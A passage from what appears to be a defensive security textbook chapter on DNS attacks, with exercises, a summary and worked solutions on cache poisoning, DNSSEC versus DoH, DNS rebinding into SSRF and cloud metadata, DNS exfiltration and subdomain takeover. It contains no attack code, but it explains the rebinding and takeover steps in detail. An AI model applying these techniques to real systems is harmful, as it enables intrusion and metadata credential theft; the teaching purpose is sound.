| Subdomain serves unexpected content | subdomain takeover (dangling record) | check CNAME/NS target ownership; `subjack`-style audit (§4.3) |
| App reaching internal IPs via a "validated" URL | DNS rebinding SSRF | verify connect-time IP validation; test with a low-TTL rebinding name (lab) |
| Suspicious high-entropy DNS queries | tunneling/exfiltration | query logs: entropy/volume/record-type/reputation (§5.4) |
| Lost DNS visibility for some clients | DoH bypassing the controlled resolver | detect direct outbound DoH/853; steer/block; enforce the VPC/corporate resolver |
| Your resolver used in a DDoS | open resolver abused for amplification | restrict recursion to your clients; enable RRL |
| Email spoofed as your domain | missing SPF/DKIM/DMARC | `dig TXT` (Chapter 16); configure them |

---

## 15. Practical Lab

Lab 17.1 is in §8. Register it in the lab index. Extension: implement a complete rebinding-robust,
internal-range-blocking URL fetcher (for a webhook/URL-preview feature) with connect-time IP validation,
IP pinning, redirect validation, and IMDSv2 assumptions, then attempt to bypass it with a low-TTL rebinding
domain you control in a lab — proving the connected-IP check (not the hostname) is what defeats rebinding.
This is the exact code pattern Chapter 50 (SSRF) requires and a high-value, reusable deliverable.

---

## 16. Exercises

### Concept questions

**17.1** Explain the two layers of DNS attack (resolution vs delegation) with an example of each, and why
DNSSEC stops one but not the other.

**17.2** Explain the difference between DNSSEC and DoH/DoT — what each protects, what each does not, and
why you often want both plus TLS.

**17.3** Explain DNS rebinding step by step and why name-based SSRF validation fails against it. What is
the robust defense?

**17.4** Explain why DNS is an effective exfiltration/C2 channel and why the same property makes it a
detection surface. How do you detect and prevent it?

**17.5** Explain subdomain takeover, why it is cloud-endemic, and how to prevent it.

### Debugging problems

**17.6** After enabling a validating resolver, a few legitimate domains return SERVFAIL. Diagnose (DNSSEC)
and explain how to distinguish a broken zone from an attack.

**17.7** An app with a URL-preview feature is being used to reach the metadata service despite hostname
validation. Explain the attack and the fix.

**17.8** DNS query logs show periodic queries with long random subdomains to one domain. What is this, and
what do you do?

### Security scenarios

**17.9** Design the complete DNS defense stack for a cloud application, mapping each control to the attack
it addresses, and identify the backstop control.

**17.10** A team enables DoH on all clients "for privacy." Explain the security trade-off for a managed/
cloud environment and how you would handle it.

### Architecture questions

**17.11** Explain how DNS rebinding connects Chapters 16 (caching/TTL), 17 (rebinding), 50 (SSRF), and 78
(IMDS), and design the end-to-end defense.

**17.12** Design DNS-based egress control and exfiltration detection for a VPC, naming the mechanisms and
their limits (including DoH bypass).

### Hands-on exercises

**17.13** Verify DNSSEC validation on your resolver (including rejecting a broken zone) and report whether
validation is active.

**17.14** Demonstrate and detect DNS exfiltration in an isolated lab, and write the detection rule.

**17.15** Implement a rebinding-robust internal-range-blocking URL validator (connect-time IP check).

### Interview questions

**17.16** "Walk me through DNS cache poisoning and how DNSSEC prevents it."

**17.17** "What's the difference between DNSSEC and DNS over HTTPS?"

**17.18** "Explain DNS rebinding and how it relates to SSRF and cloud metadata theft."

**17.19** "How would you detect and prevent DNS exfiltration?"

**17.20** "What is subdomain takeover, and why is it common in cloud environments?"

---

## 17. Summary

- **Classic DNS is attackable at two layers** — *resolution* (cache poisoning/spoofing via spoofable UDP +
  weak 16-bit entropy + caching; the Kaminsky attack; on-path spoofing via ARP/DHCP/routing MITM) and
  *delegation/provisioning* (registrar/NS hijack; **subdomain takeover** via dangling records) — plus it
  is a **covert channel** (tunneling/exfiltration) and an **amplification DDoS** vector.
- **The two-half integrity defense:** **DNSSEC** authenticates the *answer* (cryptographic signatures
  chaining to the root trust anchor; rejects forged answers; integrity, *not* confidentiality) and
  **DoH/DoT** encrypt the *transport* (confidentiality + on-path integrity client↔resolver). Use both,
  plus **end-to-end TLS** as the backstop that catches a DNS lie (a wrong IP cannot present a valid cert).
- **DNS rebinding turns SSRF into internal/metadata access** by rebinding a low-TTL name to an internal IP
  *after* validation — defeating name-based checks. The robust defense: **validate the connected IP at
  connect time, block internal ranges (v4+v6 incl. `169.254.169.254` and IPv4-mapped), pin the IP, and use
  IMDSv2** (Chapters 50, 78).
- **DNS exfiltration/tunneling bypasses egress controls** (DNS is nearly always allowed), and the same
  ubiquity makes **query logging** the detection surface; **DNS Firewall/RPZ** blocks known-bad, and
  restricting resolvers (managing DoH bypass) limits the channel.
- **Delegation security is separate from DNSSEC** — registrar MFA + **registry lock** + NS monitoring
  protect the account/delegation DNSSEC cannot; **dangling-record hygiene** prevents subdomain takeover.
- **DNS security is a layered set, each control mapped to an attack, unified by TLS as the backstop** — and
  in the cloud these are managed features (Route 53 DNSSEC, Resolver query logging, DNS Firewall, IMDSv2)
  that are off by default and that the cloud security engineer must enable and tune.

---

## 18. Knowledge Check

1. What are the two attack layers, and which does DNSSEC address? (§3, §4)
2. DNSSEC vs DoH/DoT — what does each protect and not protect? (§5.1, §5.2)
3. Walk through DNS rebinding and the robust defense. (§4.4, §5.3)
4. Why is DNS a good exfiltration channel, and how do you detect it? (§4.5, §5.4)
5. What is subdomain takeover and how is it prevented? (§4.3, §11)
6. Why does DNSSEC not stop a registrar hijack? (§4.2, §5.1)
7. Why is TLS the backstop even with DNS defenses? (§5, §11)
8. What is the DoH visibility problem for defenders? (§5.2)
9. How does DNS rebinding connect to SSRF and IMDS? (§4.4, Chapters 50, 78)
10. What DNS defenses are off-by-default cloud features you must enable? (§12)

---

## 19. Further Exploration

- The **Kaminsky DNS attack (2008)** write-ups — the definitive resolution-layer poisoning story and why
  source-port randomization + DNSSEC followed.
- RFC 4033–4035 (DNSSEC) — the chain-of-trust mechanics; and the DNS-over-TLS/HTTPS RFCs (7858, 8484).
- **DNS rebinding** research (e.g. the "Singularity of Origin" tool docs) and the OWASP SSRF cheat sheet —
  bridge to Chapter 50.
- **Subdomain takeover**: the `EdOverflow/can-i-take-over-xyz` reference and `subjack` — the practical
  hygiene/audit.
- AWS: Route 53 DNSSEC signing, Route 53 Resolver DNS Firewall, Resolver query logging, and IMDSv2 docs —
  the cloud controls (§12) to enable.
- Revisit Chapter 16 and confirm you can map every mechanic (caching, delegation, UDP, records) to an
  attack here and a defense — that mapping is the DNS security mental model.

---

## Solutions

### 17.1
The two layers: **resolution** — make a resolver return a false answer without controlling the name, e.g.
**cache poisoning** (forge responses matching the query's 16-bit ID+port so the resolver caches and serves
a wrong IP to all clients for the TTL — the Kaminsky attack), or on-path spoofing (answer faster than the
real server via an ARP/DHCP MITM). **Delegation/provisioning** — take control of the name at its source,
e.g. **registrar account compromise** (change the NS records, become authoritative for the whole domain)
or **subdomain takeover** (claim a dangling CNAME target). DNSSEC stops the *resolution* layer: it
cryptographically signs records, so a forged/poisoned answer lacks a valid signature and a validating
resolver rejects it. DNSSEC does **not** stop the *delegation* layer: if an attacker controls the
registrar account (or the signing keys), they can legitimately change and re-sign the records — the
signatures validate because the attacker *is* now the authority. So DNSSEC protects the answer's
authenticity given a trustworthy authority; protecting the authority itself requires registrar MFA +
registry lock + NS monitoring. Different layers, different defenses.

### 17.2
**DNSSEC** authenticates the *answer*: it adds cryptographic signatures (RRSIG) validated up a chain of
trust (DS/DNSKEY) to the root's pre-distributed trust anchor, so a resolver can verify a record is
authentic and unmodified — stopping poisoning/spoofing. It provides **integrity/authenticity, not
confidentiality** (queries and answers are still in the clear), and it does not protect the
client↔resolver leg's privacy. **DoH/DoT** encrypt the *transport* between the client and the resolver
(DoT over TLS/853, DoH over HTTPS/443), providing **confidentiality** (an on-path observer cannot read the
queries) and **on-path integrity** (cannot inject/modify between client and resolver) — but they do **not**
authenticate the authoritative data (a malicious resolver, or a poisoned answer the resolver received, is
still returned), and DoH can bypass controlled resolvers. You often want both: DNSSEC so the *data* is
authentic regardless of path, DoH/DoT so the *client↔resolver channel* is private and tamper-proof — plus
end-to-end TLS as the backstop, because even if DNS returns a wrong IP, the attacker's server cannot
present a valid certificate for the real name. The clean split: DNSSEC = authenticate the answer; DoH/DoT =
encrypt the transport.

### 17.3
DNS rebinding: (1) the attacker controls a domain with a very **low TTL**; (2) the victim (a browser or a
server-side URL fetcher) resolves `attacker.example`, getting the attacker's **real external IP**, which
passes any "is this external/allowed?" check that validates the name or the first-resolved IP; (3) the low
TTL expires within seconds, so the victim **re-resolves** `attacker.example`; (4) the attacker's DNS now
returns an **internal IP** (e.g. `169.254.169.254` or `10.0.x.x`); (5) the victim, still targeting the
same *name*, now connects to the **internal IP** — reaching internal/metadata services. Name-based SSRF
validation fails because it validates the *hostname* (or an earlier resolution) but then connects *by
hostname again*, at which point the name has rebound to an internal target — the validation and the use
are decoupled in time, and DNS caching/TTL bridge that gap. The robust defense: **validate the actual IP
the connection goes to, at connect time** (re-resolve, check every resolved IP against blocked internal
ranges — RFC 1918, 127/8, 169.254/16, IPv6 incl. IPv4-mapped), **pin that IP for the connection's
lifetime** so it cannot rebind mid-connection, **reject redirects to internal targets**, and use **IMDSv2**
(Chapter 78) so even a reached metadata endpoint is protected. Validate the connected IP, never just the
name.

### 17.9
The complete DNS defense stack, each control → attack, with the backstop: (1) **DNSSEC** (Route 53 signing
+ validating resolver) → cache poisoning/spoofing (answer integrity). (2) **DoT/DoH** for client↔resolver
→ on-path DNS spoofing (transport encryption), with **controlled resolvers** to avoid DoH bypass. (3)
**Registrar MFA + registry lock + NS monitoring** → registrar/delegation hijack (the top-of-chain the
DNSSEC cannot protect). (4) **Dangling-record hygiene + audit** → subdomain takeover. (5) **Connect-time IP
validation + block internal ranges + IP pinning + IMDSv2 + egress proxy** → DNS rebinding → SSRF → metadata
theft. (6) **Route 53 Resolver query logging + anomaly detection + DNS Firewall/RPZ + restricted DNS
egress** → DNS tunneling/exfiltration/C2. (7) **No open resolvers + RRL + BCP 38 + AWS Shield** →
amplification DDoS. (8) **SPF/DKIM/DMARC + CAA** (Chapter 16) → email spoofing and cert mis-issuance. The
**backstop control across all of them is end-to-end TLS with certificate validation (plus HSTS and CAA)**:
even if a DNS attack succeeds in returning a wrong IP, the attacker cannot present a valid certificate for
the real name, so the client refuses the connection — meaning the DNS defenses reduce likelihood and scope
while TLS removes most of the impact. In the cloud, most of these (DNSSEC, query logging, DNS Firewall,
IMDSv2) are off-by-default managed features you enable and tune. This layered, attack-mapped stack with a
TLS backstop is the mature DNS security posture.

### 17.16
Cache poisoning: classic DNS's only "authentication" of a response is that it matches the query's 16-bit
transaction ID, source port, and question, and arrives before the legitimate answer (all over spoofable
UDP). An attacker floods forged responses guessing the ID (and, historically, the port) for a name the
resolver is looking up; if a forged response matches and wins the race, the resolver **caches the false
answer and serves it to all its clients for the TTL** — a wrong IP for a domain, amplified and durable.
The Kaminsky attack made this practical by querying many random subdomains and forging *referrals* for the
parent, giving many race attempts and letting the attacker poison the domain's NS records (hijacking the
whole domain, not one record). Source-port randomization added entropy (~32 bits to guess) as a stopgap.
DNSSEC prevents it by having each zone cryptographically **sign** its records (RRSIG), with a chain of DS/
DNSKEY records up to the root's pre-distributed trust anchor; a validating resolver verifies the signature,
so a forged answer — which lacks a valid signature (the attacker cannot sign as the zone) — is **rejected
(SERVFAIL)** regardless of whether the attacker guessed the ID/port. DNSSEC thus authenticates the answer,
closing the "believe any matching response" gap; it does not provide confidentiality (that is DoH/DoT) and
does not stop a registrar-level hijack (the attacker would then control signing).

### 17.20
Subdomain takeover occurs when a DNS record — typically a **CNAME** (or NS) — points to an external
resource that no longer exists or is no longer claimed by you (a **dangling record**), and an attacker
registers/claims that now-available resource, thereby serving content under *your* subdomain. Example:
`blog.ledger.example` CNAMEs to `ledger-blog.herokuapp.com`; you delete the Heroku app but leave the
CNAME; an attacker creates a Heroku app named `ledger-blog` and now controls `blog.ledger.example`. The
impact is serious because the attacker controls a legitimate-looking subdomain of your registrable domain:
they can host phishing, potentially steal cookies scoped to the parent domain, obtain TLS certificates for
the subdomain (via DNS/HTTP validation, since they control it), and bypass same-site protections. It is
**cloud-endemic** because cloud resources (S3 buckets, CloudFront distributions, Heroku/Azure/GitHub Pages
endpoints, load balancers, preview environments) are constantly created and destroyed, while the DNS
records that point at them are often forgotten and outlive them — and the freed resource names/endpoints
become re-claimable by anyone. Prevention: **remove or update the DNS record as part of decommissioning
the resource** (record first, or atomically), **audit regularly for dangling records** (tools like
`subjack` and the `can-i-take-over-xyz` reference; cloud provider unclaimed-resource checks), and use
provider protections that validate ownership of alias targets. It is a hygiene problem: keep DNS records
in sync with the resources they point to.

---

*This completes DNS (Chapters 16–17). Next: Chapter 18 — UDP: Connectionless Transport and the Protocols
Built On It. We move to Layer 4, starting with UDP — the fast, connectionless transport that DNS (this
chapter), QUIC/HTTP3, and many others ride on, and whose spoofability underpins the amplification attacks
we have referenced repeatedly.*
